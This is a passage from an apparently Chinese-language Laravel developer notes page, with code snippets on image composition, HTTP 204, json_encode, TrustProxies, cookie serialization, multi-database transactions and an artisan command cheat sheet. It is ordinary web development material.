class="string">'imagick'</span>));</span><br><span class="line">如果是在 Laravel 中，可直接通过 app(<span class="string">'image'</span>) 或使用 Intervention\Image\Facades\Image 门面类。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use Intervention\Image\Facades\Image;</span><br><span class="line"></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">$manager = app(<span class="string">'image'</span>);</span><br><span class="line">合成</span><br><span class="line"></span><br><span class="line"><span class="comment">// $image = $manager-&gt;make($bg);</span></span><br><span class="line"><span class="comment">// $image = Image::make($bg);</span></span><br><span class="line"></span><br><span class="line">$image = app(<span class="string">'image'</span>)-&gt;make($bg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二维码图片https://godruoyi.com/posts/intervention-image-was-used-to-synthesize-images</span></span><br><span class="line">$qrcodeImage = app(<span class="string">'image'</span>)-&gt;make($qrcodeurl)-&gt;resize(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"><span class="comment">// 重置 头像 大小</span></span><br><span class="line">$avatarImage  = app(<span class="string">'image'</span>)-&gt;make($httpClient-&gt;request(<span class="string">'GET'</span>, $avatarurl)-&gt;getBody())-&gt;resize(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">$image-&gt;text(<span class="string">'Nickname'</span>, <span class="number">376</span>, <span class="number">320</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$font</span>) </span>&#123;</span><br><span class="line">    $font-&gt;file(public_path(<span class="string">'fonts/SimHei.ttf'</span>));</span><br><span class="line">    $font-&gt;size(<span class="number">40</span>);</span><br><span class="line">    $font-&gt;color(<span class="string">'#000000'</span>);</span><br><span class="line">    $font-&gt;align(<span class="string">'center'</span>);</span><br><span class="line">    $font-&gt;valign(<span class="string">'top'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$image-&gt;insert($qrcodeImage, <span class="string">'bottom'</span>, <span class="number">0</span>, <span class="number">360</span>);</span><br><span class="line">$image-&gt;insert($avatarImage, <span class="string">'top'</span>, <span class="number">0</span>, <span class="number">105</span>);</span><br></pre></td></tr></table></figure>
<h3 id="http-code-204"><a href="#http-code-204" class="headerlink" title="http code 204"></a>http code 204</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">204</span> 为成功状态响应码，表示目前请求成功，但客户端不需要更新其现有页面。<span class="number">204</span> 响应默认是可以被缓存的。在响应中需要包含头信息 ETag。</span><br><span class="line"></span><br><span class="line">使用惯例是，在 PUT 请求中进行资源更新，但是不需要改变当前展示给用户的页面，那么返回 <span class="number">204</span> No Content。如果新创建了资源，那么返回 <span class="number">201</span> Created 。如果页面需要更新以反映更新后的资源，那么需要返回 <span class="number">200</span> 。</span><br><span class="line"></span><br><span class="line">所以大家在做 RestFul API 接口是，store、update 什么的，别全 <span class="number">200</span> <span class="number">200</span> 的返回了，不正规。https:<span class="comment">//learnku.com/articles/28056</span></span><br></pre></td></tr></table></figure>
<h3 id="json-encode-中文"><a href="#json-encode-中文" class="headerlink" title="json_encode 中文"></a>json_encode 中文</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public/index.php</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取到内容https://learnku.com/articles/28054#topnav</span></span><br><span class="line">$content = $response-&gt;original;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查原始内容的类型是否需要转 json</span></span><br><span class="line"><span class="keyword">if</span> ($content <span class="keyword">instanceof</span> Arrayable ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> Jsonable ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> ArrayObject ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> JsonSerializable ||</span><br><span class="line">    is_array($content)) &#123;</span><br><span class="line">    <span class="comment">// 重新设置响应内容</span></span><br><span class="line">    $response-&gt;setContent(json_encode($content, JSON_UNESCAPED_UNICODE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$response-&gt;send();</span><br></pre></td></tr></table></figure>
<h3 id="升级至Laravel-5-7报错setTrustedProxies-must-be-of-the-type-integer"><a href="#升级至Laravel-5-7报错setTrustedProxies-must-be-of-the-type-integer" class="headerlink" title="升级至Laravel 5.7报错setTrustedProxies() must be of the type integer"></a>升级至Laravel 5.7报错setTrustedProxies() must be of the type integer</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">打开 App\Http\Middleware\TrustProxies</span><br><span class="line"> </span><br><span class="line">将代码：http:<span class="comment">//www.ithov.net/php/1644.html</span></span><br><span class="line"> </span><br><span class="line">protected $headers = [</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_FORWARDED</span> =&gt;</span> <span class="string">'FORWARDED'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_FOR</span> =&gt;</span> <span class="string">'X_FORWARDED_FOR'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_HOST</span> =&gt;</span> <span class="string">'X_FORWARDED_HOST'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_PORT</span> =&gt;</span> <span class="string">'X_FORWARDED_PORT'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_PROTO</span> =&gt;</span> <span class="string">'X_FORWARDED_PROTO'</span>,</span><br><span class="line">    ];</span><br><span class="line"> </span><br><span class="line">修改为：</span><br><span class="line"> </span><br><span class="line">protected $headers = Request::HEADER_X_FORWARDED_ALL;</span><br></pre></td></tr></table></figure>
<h3 id="openssl-encrypt-expects-parameter-1-to-be-string"><a href="#openssl-encrypt-expects-parameter-1-to-be-string" class="headerlink" title="openssl_encrypt() expects parameter 1 to be string"></a>openssl_encrypt() expects parameter 1 to be string</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.5</span> 升级到 <span class="number">5.5</span><span class="number">.42</span> 后遇到的 Cookie 序列化问题</span><br><span class="line">Laravel 新版为了防止 PHP 对象的序列化/反序列化漏洞被利用，不再对 Cookie 值进行自动的序列化和反序列化处理。</span><br><span class="line">\Cookie::queue(<span class="string">'user'</span>, [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>], <span class="number">720</span>, <span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line">Laravel 更新到 v5<span class="number">.5</span><span class="number">.42</span> 后，因为 Laravel 不再自动对 Cookie 值 [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>] 进行序列化处理，而 openssl_encrypt ( string $data ... ) 只能加密字符串数据，这个时候程序就会抛出错误：openssl_encrypt() expects parameter <span class="number">1</span> to be string, array given。</span><br><span class="line"></span><br><span class="line">解决方法：https:<span class="comment">//segmentfault.com/a/1190000018799611</span></span><br><span class="line"></span><br><span class="line">新版里面在中间件 AppHttpMiddlewareEncryptCookies 新增静态属性 $serialize，当设置为 <span class="literal">true</span> 时可开启 Cookie 值的自动序列化和反序列化处理。</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Indicates if cookies should be serialized.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @var bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">protected <span class="keyword">static</span> $serialize = <span class="literal">true</span>;</span><br><span class="line">【推荐】将 Cookie 值使用 <span class="built_in">JSON</span> 函数编码成字符串后再进行存储（获取 Cookie 值后需调用 <span class="built_in">JSON</span> 函数进行解码）。</span><br><span class="line">\Cookie::queue(<span class="string">'user'</span>, json_encode([<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>]), <span class="number">720</span>, <span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="多库下的DB-transaction-事务失效"><a href="#多库下的DB-transaction-事务失效" class="headerlink" title="多库下的DB::transaction()事务失效"></a>多库下的DB::transaction()事务失效</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">DB::transaction(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$uid, $roleId</span>) </span>&#123;</span><br><span class="line">   RoomUserRole::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'role_id'</span> =&gt; $roleId,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">   RoomUserRoleLog::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'handle_type'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">     <span class="string">'admin_uid'</span> =&gt; Auth::user()-&gt;id,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">mysql 第二句会报错抛出一个异常， 查看数据库时第一句依然出入成功</span><br><span class="line">原文：https:<span class="comment">//blog.csdn.net/mathphp/article/details/82593779 </span></span><br><span class="line">DB::transaction()使用的是默认库的事务操作。所以要指定哪个数据库的事务</span><br><span class="line"></span><br><span class="line">DB::connection(<span class="string">'mysql2'</span>)-&gt;transaction(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$uid, $roleId</span>) </span>&#123;</span><br><span class="line">   RoomUserRole::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'role_id'</span> =&gt; $roleId,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">   RoomUserRoleLog::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'handle_type'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">     <span class="string">'admin_uid'</span> =&gt; Auth::user()-&gt;id,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">&#125;); <span class="comment">// 这样你会发现事务才正常回滚</span></span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;beginTransaction();</span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;commit();</span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;rollBack(); <span class="comment">// 指定库，不然都会跑默认配置库的事务</span></span><br></pre></td></tr></table></figure>
<h3 id="执行时间和内存消耗"><a href="#执行时间和内存消耗" class="headerlink" title="执行时间和内存消耗"></a>执行时间和内存消耗</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElapsedTime</span>(<span class="params">int $decimals  = <span class="number">2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> number_format(microtime(<span class="literal">true</span>) - request()-&gt;server(<span class="string">'REQUEST_TIME_FLOAT'</span>), $decimals) . <span class="string">' s'</span>;</span><br><span class="line">&#125;</span><br><span class="line">内存使用：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMemoryUsage</span>(<span class="params">precision = <span class="number">2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $size = memory_get_usage(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $unit = [<span class="string">'b'</span>, <span class="string">'kb'</span>, <span class="string">'mb'</span>, <span class="string">'gb'</span>, <span class="string">'tb'</span>, <span class="string">'pb'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> round($size / pow(<span class="number">1024</span>, ($i = floor(log($size, <span class="number">1024</span>)))), $precision) . <span class="string">' '</span> . $unit[$i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="速查表"><a href="#速查表" class="headerlink" title="速查表"></a>速查表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 针对命令显示帮助信息</span></span><br><span class="line">php artisan --help OR -h</span><br><span class="line"><span class="comment">// 抑制输出信息</span></span><br><span class="line">php artisan --quiet OR -q</span><br><span class="line"><span class="comment">// 打印 Laravel 的版本信息</span></span><br><span class="line">php artisan --version OR -V</span><br><span class="line"><span class="comment">// 不询问任何交互性的问题</span></span><br><span class="line">php artisan --no-interaction OR -n</span><br><span class="line"><span class="comment">// 强制输出 ANSI 格式</span></span><br><span class="line">php artisan --ansi</span><br><span class="line"><span class="comment">// 禁止输出 ANSI 格式</span></span><br><span class="line">php artisan --no-ansi</span><br><span class="line"><span class="comment">// 显示当前命令行运行的环境</span></span><br><span class="line">php artisan --env</span><br><span class="line"><span class="comment">// -v|vv|vvv 通过增加 v 的个数来控制命令行输出内容的详尽情况: 1 个代表正常输出, 2 个代表输出更多消息, 3 个代表调试</span></span><br><span class="line">php artisan --verbose</span><br><span class="line"><span class="comment">// 移除编译优化过的文件 (storage/frameworks/compiled.php)</span></span><br><span class="line">php artisan clear-compiled</span><br><span class="line"><span class="comment">// 显示当前框架运行的环境</span></span><br><span class="line">php artisan env</span><br><span class="line"><span class="comment">// 显示某个命令的帮助信息</span></span><br><span class="line">php artisan help</span><br><span class="line"><span class="comment">// 显示所有可用的命令</span></span><br><span class="line">php artisan list</span><br><span class="line"><span class="comment">// 进入应用交互模式</span></span><br><span class="line">php artisan tinker</span><br><span class="line"><span class="comment">// 配合 dump() 函数调试数据</span></span><br><span class="line">php artisan dump-server</span><br><span class="line"><span class="comment">// 进入维护模式</span></span><br><span class="line">php artisan down</span><br><span class="line"><span class="comment">// 退出维护模式</span></span><br><span class="line">php artisan up</span><br><span class="line"><span class="comment">// 优化框架性能</span></span><br><span class="line"><span class="comment">// --force    强制编译已写入文件 (storage/frameworks/compiled.php)</span></span><br><span class="line"><span class="comment">// --psr      不对 Composer 的 dump-autoload 进行优化</span></span><br><span class="line">php artisan optimize [--force] [--psr]</span><br><span class="line"><span class="comment">// 更改前端预设</span></span><br><span class="line"><span class="comment">// type_name (可以是 none, bootstrap, vue, react)</span></span><br><span class="line">php artisan preset [options] [--] type_name</span><br><span class="line"><span class="comment">// 启动内置服务器</span></span><br><span class="line">php artisan serve</span><br><span class="line"><span class="comment">// 更改默认端口</span></span><br><span class="line">php artisan serve --port <span class="number">8080</span></span><br><span class="line"><span class="comment">// 使其在本地服务器外也可正常工作</span></span><br><span class="line">php artisan serve --host <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="comment">// 更改应用命名空间</span></span><br><span class="line">php artisan app:name namespace</span><br><span class="line"><span class="comment">// 清除过期的密码重置令牌</span></span><br><span class="line">php artisan auth:clear-resets</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空应用缓存</span></span><br><span class="line">php artisan cache:clear</span><br><span class="line"><span class="comment">// 移除 key_name 对应的缓存</span></span><br><span class="line">php artisan cache:forget key_name [&lt;store&gt;]</span><br><span class="line">// 创建缓存数据库表 migration</span><br><span class="line">php artisan cache:table</span><br><span class="line"></span><br><span class="line">// 合并所有的配置信息为一个，提高加载速度</span><br><span class="line">php artisan config:cache</span><br><span class="line">// 移除配置缓存文件</span><br><span class="line">php artisan config:clear</span><br><span class="line"></span><br><span class="line">// 程序内部调用 Artisan 命令</span><br><span class="line">$exitCode = Artisan::call('config:cache');</span><br><span class="line">// 运行所有的 seed 假数据生成类</span><br><span class="line">// --class      可以指定运行的类，默认是: "DatabaseSeeder"</span><br><span class="line">// --database   可以指定数据库</span><br><span class="line">// --force      当处于生产环境时强制执行操作</span><br><span class="line">php artisan db:seed [--class[="..."]] [--database[="..."]] [--force]</span><br><span class="line"></span><br><span class="line">// 基于注册的信息，生成遗漏的 events 和 handlers</span><br><span class="line">php artisan event:generate</span><br><span class="line">// 罗列所有事件和监听器</span><br><span class="line">php artisan event:list</span><br><span class="line">// 缓存事件和监听器</span><br><span class="line">php artisan event:cache</span><br><span class="line">// 清除事件和监听器缓存</span><br><span class="line">php artisan event:clear</span><br><span class="line"></span><br><span class="line">// 生成新的处理器类</span><br><span class="line">// --command      需要处理器处理的命令类名字</span><br><span class="line">php artisan handler:command [--command="..."] name</span><br><span class="line">// 创建一个新的时间处理器类</span><br><span class="line">// --event        需要处理器处理的事件类名字</span><br><span class="line">// --queued       需要处理器使用队列话处理的事件类名字</span><br><span class="line">php artisan handler:event [--event="..."] [--queued] name</span><br><span class="line"></span><br><span class="line">// 生成应用的 key（会覆盖）</span><br><span class="line">php artisan key:generate</span><br><span class="line"></span><br><span class="line">// 发布本地化翻译文件到 resources 文件下</span><br><span class="line">// locales: 逗号分隔，如 zh_CN,tk,th [默认是: "all"]</span><br><span class="line">php artisan lang:publish [options] [--] [&lt;locales&gt;]</span><br><span class="line"></span><br><span class="line">// 创建用户认证脚手架</span><br><span class="line">php artisan make:auth</span><br><span class="line">// 创建 Channel 类</span><br><span class="line">php artisan make:channel name</span><br><span class="line">// 在默认情况下, 这将创建未加入队列的自处理命令</span><br><span class="line">// 通过 --handler 标识来生成一个处理器, 用 --queued 来使其入队列.</span><br><span class="line">php artisan make:command [--handler] [--queued] name</span><br><span class="line">// 创建一个新的 Artisan 命令</span><br><span class="line">//  --command     命令被调用的名称。 (默认为: "command:name")</span><br><span class="line">php artisan make:console [--command[="..."]] name</span><br><span class="line">// 创建一个新的资源控制器</span><br><span class="line">// --plain      生成一个空白的控制器类</span><br><span class="line">php artisan make:controller [--plain] name</span><br><span class="line">php artisan make:controller App\\Admin\\Http\\Controllers\\DashboardController</span><br><span class="line">// 创建一个新的事件类</span><br><span class="line">php artisan make:event name</span><br><span class="line">// 创建异常类</span><br><span class="line">php artisan make:exception name</span><br><span class="line">// 创建模型工厂类</span><br><span class="line">php artisan make:factory name</span><br><span class="line">// 创建一个队列任务文件</span><br><span class="line">php artisan make:job </span><br><span class="line">// 创建一个监听者类</span><br><span class="line">php artisan make:listener name</span><br><span class="line">// 创建一个新的邮件类</span><br><span class="line">php artisan make:mail name</span><br><span class="line">// 创建一个新的中间件类</span><br><span class="line">php artisan make:middleware name</span><br><span class="line">// 创建一个新的迁移文件</span><br><span class="line">// --create     将被创建的数据表.</span><br><span class="line">// --table      将被迁移的数据表.</span><br><span class="line">php artisan make:migration [--create[="..."]] [--table[="..."]] name</span><br><span class="line">// 创建一个新的 Eloquent 模型类</span><br><span class="line">php artisan make:model User</span><br><span class="line">php artisan make:model Models/User</span><br><span class="line">// 新建一个消息通知类</span><br><span class="line">php artisan make:notification TopicRepliedNotification</span><br><span class="line">// 新建一个模型观察者类</span><br><span class="line">php artisan make:observer UserObserver</span><br><span class="line">// 创建授权策略</span><br><span class="line">php artisan make:policy PostPolicy</span><br><span class="line">// 创建一个新的服务提供者类</span><br><span class="line">php artisan make:provider name</span><br><span class="line">// 创建一个新的表单请求类</span><br><span class="line">php artisan make:request name</span><br><span class="line">// 创建一个 API 资源类</span><br><span class="line">php artisan make:resource name</span><br><span class="line">// 新建验证规则类</span><br><span class="line">php artisan make:rule name</span><br><span class="line">// 创建模型脚手架</span><br><span class="line">// &lt;name&gt; 模型名称，如 Post</span><br><span class="line">// -s, --schema=SCHEMA 表结构如：--schema="title:string"</span><br><span class="line">// -a, --validator[=VALIDATOR] 表单验证，如：--validator="title:required"</span><br><span class="line">// -l, --localization[=LOCALIZATION] 设置本地化信息，如：--localization="key:value"</span><br><span class="line">// -b, --lang[=LANG] 设置本地化语言 --lang="en"</span><br><span class="line">// -f, --form[=FORM] 使用 Illumintate/Html Form 来生成表单选项，默认为 false</span><br><span class="line">// -p, --prefix[=PREFIX] 表结构前缀，默认 false</span><br><span class="line">php artisan make:scaffold  [options] [--] &lt;name&gt;</span><br><span class="line">// 生成数据填充类</span><br><span class="line">php artisan make:seeder</span><br><span class="line">// 生成测试类</span><br><span class="line">php artisan make:test</span><br><span class="line"></span><br><span class="line">// 数据库迁移</span><br><span class="line">// --database   指定数据库连接（下同）</span><br><span class="line">// --force      当处于生产环境时强制执行，不询问（下同）</span><br><span class="line">// --path       指定单独迁移文件地址</span><br><span class="line">// --pretend    把将要运行的 SQL 语句打印出来（下同）</span><br><span class="line">// --seed       Seed 任务是否需要被重新运行（下同）</span><br><span class="line">php artisan migrate [--database[="..."]] [--force] [--path[="..."]] [--pretend] [--seed]</span><br><span class="line">// 创建迁移数据库表</span><br><span class="line">php artisan migrate:install [--database[="..."]]</span><br><span class="line">// Drop 所有数据表并重新运行 Migration</span><br><span class="line">php artisan migrate:fresh</span><br><span class="line">// 重置并重新运行所有的 migrations</span><br><span class="line">// --seeder     指定主 Seeder 的类名</span><br><span class="line">php artisan migrate:refresh [--database[="..."]] [--force] [--seed] [--seeder[="..."]]</span><br><span class="line">// 回滚所有的数据库迁移</span><br><span class="line">php artisan migrate:reset [--database[="..."]] [--force] [--pretend]</span><br><span class="line">// 回滚最最近一次运行的迁移任务</span><br><span class="line">php artisan migrate:rollback 